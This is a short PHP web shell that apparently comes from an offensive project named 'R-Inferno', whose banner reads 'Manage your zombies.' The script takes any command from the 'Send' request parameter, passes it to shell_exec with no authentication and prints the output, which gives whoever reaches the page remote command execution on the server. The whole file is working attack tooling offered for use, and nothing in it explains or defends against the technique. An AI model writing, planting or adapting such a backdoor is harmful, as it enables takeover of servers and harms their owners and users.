<?php
header('Content-Type: text/html; charset=utf-8');
$banner = "
            ____        ____      ____                    
           / __ \      /  _/___  / __/__  _________  ____
          / /_/ /_____ / // __ \/ /_/ _ \/ ___/ __ \/ __ \
         / _, _/_____// // / / / __/  __/ /  / / / / /_/ /
        /_/ |_|     /___/_/ /_/_/  \___/_/  /_/ /_/\____/

            https://github.com/Rezn0y/R-Inferno v1.0.0

                    Rezn0y: R-Inferno Project
                    Manage your zombies. ϟϟ
                                            ";

function executeCommand($cmd) {
    $command = escapeshellcmd($cmd);
    $output = shell_exec($command);
    
    return $output;
}

function centerText($text) {
    $lines = explode("\n", $text);
    $maxLength = max(array_map('strlen', $lines));
    $centeredText = "";
    
    foreach ($lines as $line) {
        $padding = str_repeat(" ", (int)(($maxLength - strlen($line)) / 2));
        $centeredText .= $padding . $line . "\n";
    }
    
    return $centeredText;
}

if(isset($_REQUEST['Send'])) {
    $cmd = $_REQUEST['Send'];
    $output = executeCommand($cmd);
    
    echo "<pre>" . centerText($banner) . "\n\n$output</pre>";
} else {
    echo "<pre>" . centerText($banner) . "</pre>";
}
?>
